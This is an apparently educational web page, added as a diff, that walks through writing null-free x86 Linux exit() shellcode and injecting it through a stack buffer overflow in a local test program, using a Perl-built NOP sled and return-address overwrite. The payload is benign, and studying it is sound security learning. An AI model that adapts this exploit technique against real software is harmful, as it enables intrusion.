@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <title>BlueHood - Cyber Security Learning</title>
+    <!-- Bootstrap -->
+    <link href="../css/bootstrap.min.css" rel="stylesheet">
+    <!-- Style CSS -->
+    <link href="../css/styles.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700i" rel="stylesheet">
+    <!-- FontAwesome CSS -->
+    <link rel="stylesheet" type="text/css" href="../css/fontello.css">
+    <link href="../css/font-awesome.min.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div class="header-wrapper">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-2 col-md-2 col-sm-12 col-xs-12">
+                    <a href="index.html"><img src="../images/logo2.png" alt="" style="width:75px;height:75px;" class="alignright"></a>
+                </div>
+                <div class="col-lg-8 col-md-10 col-sm-12 col-xs-12">
+                    <div class="navigation">
+                        <div id="navigation">
+                            <ul>
+                                <li class="active"><a href="../index.html" title="Home">Home</a></li>
+                                <li class="active"><a href="../pentesting.html" title="Penetration Testing">Penetration Testing</a></li>
+                                <li class="active"><a href="../exploitdev.html" title="Exploit Development">Exploit Development</a></li>
+                                <li class="active"><a href="../malware.html" title="Malware">Malware</a></li>
+                                <li class="active"><a href="../shellcode.html" title="Shellcode">Shellcode</a></li>
+                                
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-2 hidden-md hidden-sm hidden-xs">
+                    <div class="header-btn"><a href="#" class="btn btn-header">get started</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- header-section close -->
+    <!-- page-header-start -->
+    <div class="page-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                    <div class="page-section">
+                        <h1 class="page-title ">Shellcode</h1>
+                        <h3 class="page-title ">3.1: Exit() Shellcode </h1>
+                        <div class="page-breadcrumb">
+                            <ol class="breadcrumb">
+                                <li><a href="../exploitdev.html">Shellcode</a></li>
+                                <li>3. BASIC SHELLCODE ON X86 LINUX SYSTEMS</li>
+                                <li>3.1: Exit() Shellcode</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 col-md-6 col-sm-6 hidden-xs">
+                    <div class="page-section">
+                         <p>The world of Shellcode is a weird and wonderful place, however, it can be rather challenging. We will start by writing Shellcode for 32 bit Linux systems and begin with the simplest example possible - Shellcode that causes the program to exit. Whilst this is not particularly useful it will illustrate the process of writing Shellcode. We will move onto more practical examples later on. </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- page-header-close -->
+    <div class="space-medium">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-md-8 col-sm-8 col-xs-12">
+                    <div class="row">
+                        <div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
+                            <div class="post-block">
+                                <!-- post holder -->
+                                <div class="post-img">
+                                    <!-- post img -->
+                                    <a href="#" class="imghover"><img src="images/post-img-1.jpg" alt="" class="img-responsive"></a>
+                                </div>
+                                <!-- /.post img -->
+                                <div class="post-content">
+                                    <!-- post content -->
+                                    <div class="post-header">
+
+                                    </div>
+                                    <!-- /.post header -->
+                                    <p style="color: red;">All the content on this website, including this post, is intended for educational use only. The techniques and processes presented should only be used against systems you own or have explicit written permission to target. Otherwise, you are breaking the Law - be smart. The author/s of this website will not accept any liability for misuse of this content.</p>
+                                    <br>
+                                    <img src="./images/3-1-meme.png" alt="" class="img-responsive" style="display:block; margin-right: auto; margin-left: auto;"></a><br><br>
+                                    <p>Whilst writing this Shellcode we will refer to the steps outlined in <a href="https://bluehood.github.io/exploitdev/1-introduction.html">1. Introduction.</a></p>
+
+                                    <h2>Step 1: Writing the ‘Shellcode’ in C </h2>
+                                    <p>This is perhaps the most technical and difficult bit of programming I've ever done so be warned. Just kidding! Writing a program that immediately exits is trivial. We will use the exit() syscall in main to immediately terminate the program. </p>
+                                    <pre>(exit.c)
+
+main() {
+    exit(0);
+}</pre>
+                                    <p>Ta-da. We then compile using the static option to prevent dynamic linking. This will preserve our exit syscall.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ gcc -static -o exit exit.c
+exit.c:1:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+ main() {
+ ^~~~
+exit.c: In function ‘main’:
+exit.c:2:2: warning: implicit declaration of function ‘exit’ [-Wimplicit-function-declaration]
+ exit(0);
+ ^~~~
+exit.c:2:2: warning: incompatible implicit declaration of built-in function ‘exit’
+exit.c:2:2: note: include ‘<stdlib.h>’ or provide a declaration of ‘exit’
+debug@lbuntu:~/Documents/shellcode/chapter3$ ./exit 
+debug@lbuntu:~/Documents/shellcode/chapter3$ </pre>
+                                    <p>As we can see the program just exits - as expected.</p>
+                                    <br>
+                                    <h2>Step 2: Debugging the Shellcode Program </h2>
+                                    <p>We use gdb to disassemble the Shellcode program. We have installed the PEDA plugin which can be found at <a href="https://github.com/longld/peda">https://github.com/longld/peda.</a></p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ gdb -q ./exit
+Reading symbols from ./exit...(no debugging symbols found)...done.
+gdb-peda$ disas _exit
+Dump of assembler code for function _exit:
+ 0x0806c15c <+0>:   mov ebx,DWORD PTR [esp+0x4]
+ 0x0806c160 <+4>:   mov eax,0xfc
+ 0x0806c165 <+9>:   call DWORD PTR gs:0x10
+ 0x0806c16c <+16>:  mov eax,0x1
+ 0x0806c171 <+21>:  int 0x80
+ 0x0806c173 <+23>:  hlt 
+End of assembler dump.
+gdb-peda$ </pre>
+                                    <p>As we can see the syscall is being made at <+21>. Before the syscall can be made the program loads the arguments of the call into EAX and EBX. At <+0> the value 0x0 is moved into EBX. At <+16> the value of 0x1 is moved into EAX (the number of the syscall). Lines <+4> and <+9> refer to sycall 252, the exit_group() syscall,
+                                    which is not relevant to us here. </p>
+                                    <br>
+                                    <h2> Step 3: Understand How the Assembly Code works </h2>
+                                    <p>We now need to write an assembly version of this program using the disassembled program above. We then compile and test that the program works and extract the opcodes to be used in our Shellcode.</p>
+                                    <p>The assembly is also fairly trivial. We use lines <+0>, <+16> and <+21> to write the assembly code. </p>
+                                    <pre>(exit_shellcode.asm)
+
+ Section .text
+
+ global _start
+
+_start:
+    mov eax,1
+    mov ebx,0
+    int 0x80</pre>
+                                    <p>Instead of taking the value 0x0 off the Stack, we have specified the value 0x0 in the code directly. Otherwise, all the commands are the same. Our arguments will be loaded into the appropriate registers and the syscall will be made, transferring execution from user space to kernel space. This will terminate the program. </p>
+                                    <p>Let's compile the program and verify this is the case.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ nasm -f elf exit_shellcode.asm 
+debug@lbuntu:~/Documents/shellcode/chapter3$ ld -o exit_shellcode exit_shellcode.o
+debug@lbuntu:~/Documents/shellcode/chapter3$</pre>
+                                    <p>Now we can run strace to print out the system calls made and verify the exit() is called.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ strace ./exit_shellcode 
+execve("./exit_shellcode", ["./exit_shellcode"], 0xbffff660 /* 22 vars */) = 0
+<b>exit(0) = ?</b>
++++ exited with 0 +++
+debug@lbuntu:~/Documents/shellcode/chapter3$</pre>
+                                    <p>That's good it works as expected. Now all that remains is to extract the opcodes of the assembly commands to be used in our Shellcode. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ objdump -d exit_shellcode
+
+exit_shellcode: file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:   <b>b8 01 00 00 00</b> mov $0x1,%eax
+ 8048065:   <b>bb 00 00 00 00</b> mov $0x0,%ebx
+ 804806a:   <b>cd 80</b> int $0x80
+debug@lbuntu:~/Documents/shellcode/chapter3$ </pre>
+                                    <p>We now put the opcodes into a C program which will execute them. </p>
+                                    <pre>(exit2.c)
+
+#include &#x3C;stdio.h&#x3E;
+#include &#x3C;string.h&#x3E;
+
+char *shellcode = &#x22;\xb8\x01\x00\x00\x00&#x22;
+ &#x22;\xbb\x00\x00\x00\x00&#x22;
+ &#x22;\xcd\x80&#x22;;
+
+int main(void)
+{
+ (*(void(*)()) shellcode)();
+ return 0;
+}</pre>
+                                    <p>Let's test our Shellcode works. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ gcc -o exit2 exit2.c
+debug@lbuntu:~/Documents/shellcode/chapter3$ strace ./exit2 
+execve("./exit2", ["./exit2"], 0xbffff670 /* 22 vars */) = 0
+brk(NULL) = 0x403000
+access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
+access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=80054, ...}) = 0
+mmap2(NULL, 80054, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fbe000
+close(3) = 0
+access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \220\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1942840, ...}) = 0
+mmap2(NULL, 1948188, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7de2000
+mprotect(0xb7fb7000, 4096, PROT_NONE) = 0
+mmap2(0xb7fb8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d5000) = 0xb7fb8000
+mmap2(0xb7fbb000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fbb000
+close(3) = 0
+set_thread_area({entry_number=-1, base_addr=0xb7fd30c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=6)
+mprotect(0xb7fb8000, 8192, PROT_READ) = 0
+mprotect(0x401000, 4096, PROT_READ) = 0
+mprotect(0xb7ffe000, 4096, PROT_READ) = 0
+munmap(0xb7fbe000, 80054) = 0
+<b>exit(0) = ?</b>
++++ exited with 0 +++
+debug@lbuntu:~/Documents/shellcode/chapter3$ </pre>
+                                    <p>As you can see our syscall is made in the final line of strace. Our Shellcode works. The next step is to make our Shellcode injectable and smaller so it can be used during exploitation. </p>
+                                    <br>
+                                    <h2> Step 4: Cleaning Up our Shellcode </h2>
+                                    <p>At the moment our Shellcode will not work in an exploit as it contains several null bytes which will prematurely terminate our payload. In other circumstance, there may be other bad characters that we must avoid in our Shellcode. </p>
+                                    <pre>b8 01 00 00 00  mov $0x1,%eax
+bb 00 00 00 00  mov $0x0,%ebx
+cd 80           int $0x80</pre>
+                                    <p>As we can see the first two instructions are responsible for producing the NULL bytes. We will focus on changing these instructions so they produce the same outcome but do not contain any null bytes (x00). </p>
+                                    <p>The first instruction contains three null bytes whereas x01 is only one byte. Since each of the registers is 32-bit it contains 4 bytes worth of space. Thus when we write x01 into EAX we are writing x00000001 into EAX to fill up all the space in EAX. But we only want to change the first 8-bits of the register, otherwise, we will have to specify null bytes in out Shellcode.</p>
+                                    <p>We can get around this problem, however. Each 32-bit register can be broken into two 16-bit sections. In turn, each of these 16-bit sections can be broken down into two 8-bit sections.</p>
+                                    <p>The first 16-bits of the EAX register can be referenced by the AX register. The AX register is broken down into the AH and AL (Higher and Lower). Hence, the first 8-bits of the EAX register can be referenced by the AL register. </p>
+                                    <p>We replace EAX with AL in the first instruction to obtain. </p>
+                                    <pre>b0 01 mov       $0x1,%al
+bb 00 00 00 00  mov $0x0,%ebx
+cd 80           int $0x80</pre>
+                                    <p>(We don't know the opcodes yet unless we look them up. We include them to emphasis exactly what we are doing)</p>
+                                    <p>This removes all the null bytes in the first line. Now for the second line. We cannot use the same trick - we will have to specify a null byte rather than 0x01. Instead, we make use of the XOR function. In particular, any value XORed with itself will give an output of zero. Thus we can use the command xor %ebx,%ebx to store a value of x00 in EBX (strictly speaking value of x00000000). </p>
+                                    <pre>b0 01    mov $0x1,%al
+31 db    xor %ebx,%ebx
+cd 80    int $0x80</pre>
+                                    <p>We've now removed all null bytes from our Shellcode. Let's test if it works.</p>
+                                    <br>
+                                    <h2>Step 5: Extract Opcodes and Create Shellcode.</h2>
+                                    <pre>(exit_shellcode.asm) 
+
+Section .text
+
+ global _start
+
+_start:
+    mov al,1 
+    xor ebx,ebx
+    int 0x80</pre>
+                                    <p>We compile this program and extract the opcodes.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3$ nasm -f elf exit_shellcode.asm
+debug@lbuntu:~/Documents/shellcode/chapter3$ ld -o exit_shellcode exit_shellcode.o
+debug@lbuntu:~/Documents/shellcode/chapter3$ objdump -d exit_shellcode
+
+exit_shellcode: file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:   b0 01 mov $0x1,%al
+ 8048062:   31 db xor %ebx,%ebx
+ 8048064:   cd 80 int $0x80
+debug@lbuntu:~/Documents/shellcode/chapter3$</pre>
+                                    <p>The null bytes are removed and our Shellcode has been reduced in size. Now we have fully working and injectable Shellcode. To demonstrate this we have modified an exploit developed at <a href="https://bluehood.github.io/exploitdev/2-3-entry.html">https://bluehood.github.io/exploitdev/2-3-entry.html</a> and <a href="https://bluehood.github.io/exploitdev/2-4-entry.html">https://bluehood.github.io/exploitdev/2-4-entry.html</a> for a simple program to include this exit() syscall Shellcode.</p>
+                                    <pre>(exploit)                           --shellcode--
+$(perl -e 'print "\x90"x150 . "\xb0\x01\x31\xdb\xcd\x80" . "A"x20 . "\x30\xfc\xff\xbf"x10')</pre>
+                                    <p>We have increased the number of A characters printed to account for the change in length of our Shellcode (a decrease by 17 bytes met with an increase of 17 A characters printed so the RET overwrite aligns properly). </p>
+                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ env -i $(pwd)/simple_overflow $(perl -e 'print "\x90"x150 . "\xb0\x01\x31\xdb\xcd\x80" . "A"x20 . "\x30\xfc\xff\xbf"x10')
+Hello �������������������������������������������������������������������������������������������������������������������������������������������������������1�̀AAAAAAAAAAAAAAAAAAAA0���0���0���0���0���0���0���0���0���0���
+debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
+                                    <p>As you can see the program exits cleanly without a segmentation fault. Our Shellcode was injected into memory and executed by the program. This caused the program to exit. Yay, we have some working Shellcode (even if it isn't that useful). </p>
+                                    <p>In the next post, we'll look at making some Shellcode that is more practical and will aid an attacker in gaining access to the underlying system.</p>
+
+                                    <h3>References:</h3><p>
+                                    The Shellcoder's Handbook, Discovering and Exploiting Security Holes
+                                    </p>
+
+
+                                    
+                                    <!--<img src="images/left-image.jpg" alt="" class="alignleft"> -->
+                                    
+                                    <!-- <div class="related-post-block">
+                                        
+                                        <div class="row">
+                                            <div class="col-lg-12 col-sm-12 col-md-12 col-sm-12">
+                                                <h3 class="related-post-title">Recommended Posts</h3>
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
+                                                <div class="related-post">
+                                                    
+                                                    <div class="related-img">
+                                                        <a href="#" class="imghover"><img src="images/related-post-2.jpg" alt="" class="img-responsive"></a>
+                                                    </div>
+                                                    <div class="related-post-content">
+                                                        <h4 class="related-title"><a href="#" class="title">Drinking water dilutes 
+stomach acid</a></h4>
+                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"diet tips"</a> </span></div>
+                                                    </div>
+                                                </div>
+                                               
+                                            </div>
+                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
+                                                <div class="related-post">
+                                                    
+                                                    <div class="related-img">
+                                                        <a href="#" class="imghover"><img src="images/related-post-1.jpg" alt="" class="img-responsive"></a>
+                                                    </div>
+                                                    <div class="related-post-content">
+                                                        <h4 class="related-title"><a href="#" class="title">Top 5 natural therapies
+to fight hpylori</a></h4>
+                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"health care</a> </span></div>
+                                                    </div>
+                                                </div>
+                                                
+                                            </div>
+                                        </div>
+                                    </div> -->
+                                    <!-- /.related post block -->
+                                    <div class="post-navigation">
+                                        <!-- post navigation -->
+                                        <div class="row">
+                                            <div class="nav-links">
+                                                <div class="col-md-6 col-sm-6">
+                                                    <div class="nav-previous">
+                                                        <!-- nav previous -->
+                                                        <a href="#" class="prev-link">previous post</a>
+                                                        <div class="previous-next-title">
+                                                            <h5><a href="#" class="title"></a></h5>
+                                                        </div>
+                                                    </div>
+                                                    <!-- /. nav previous -->
+                                                </div>
+                                                <div class="col-md-6 col-sm-6">
+                                                    <div class="nav-next text-right">
+                                                        <!-- nav next -->
+                                                        <a href="#" class="next-link">next post</a>
+                                                        <div class="previous-next-title">
+                                                            <h5><a href="#" class="title"></a></h5>
+                                                        </div>
+                                                    </div>
+                                                    <!-- /.nav previous -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!-- /. post navigation -->
+
+
+                                    
+                                    
+                                </div>
+                                <!-- /.post content -->
+                            </div>
+                            <!-- /.post holder -->
+                        </div>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+    <!-- footer start -->
+    <div class="footer">
+        <div class="container">
+            <div class="row">
+                <!-- footer-about-start -->
+                
+                <!-- footer-useful links-start -->
+                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
+                    <div class="footer-widget">
+                        <h3 class="footer-title">Quick Links</h3>
+                        <ul class="angle angle-right">
+                            <li><a href="#">Home </a></li>
+                            <li><a href="#">Penetration Testing </a></li>
+                            <li><a href="#">Exploit Development</a></li>
+                            <li><a href="#">Malware</a></li>
+                            <li> <a href="#">Shellcode</a></li>
+                            <li> <a href="#">All Topics</a></li>
+                        </ul>
+                    </div>
+                </div>
+
+                 
+                <img src="../images/logo3.png" alt="" class="alignright"></a>
+                      
+                <!-- footer-useful links-close -->
+                <!-- footer-form-start -->
+                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
+    
+                </div>
+                <!-- footer-tiny-text-start -->
+                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+                    <div class="tiny-footer">
+                        <p>© 2020 - BlueHood. All Rights Reserved.</p>
+                        <p> See https://easetemplate.com for the Website Template and Other Templates </p>
+                    </div>
+                </div>
+                <!-- footer-tiny-text-start -->
+                <!-- footer-form-close -->
+            </div>
+        </div>
+    </div>
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="../js/jquery.min.js" type="text/javascript"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="../js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="../js/navigation.js" type="text/javascript"></script>
+    <script src="../js/menumaker.js" type="text/javascript"></script>
+    <script type="text/javascript" src="../js/jquery.sticky.js"></script>
+    <script type="text/javascript" src="../js/sticky-header.js"></script>
+</body>
+
+</html>
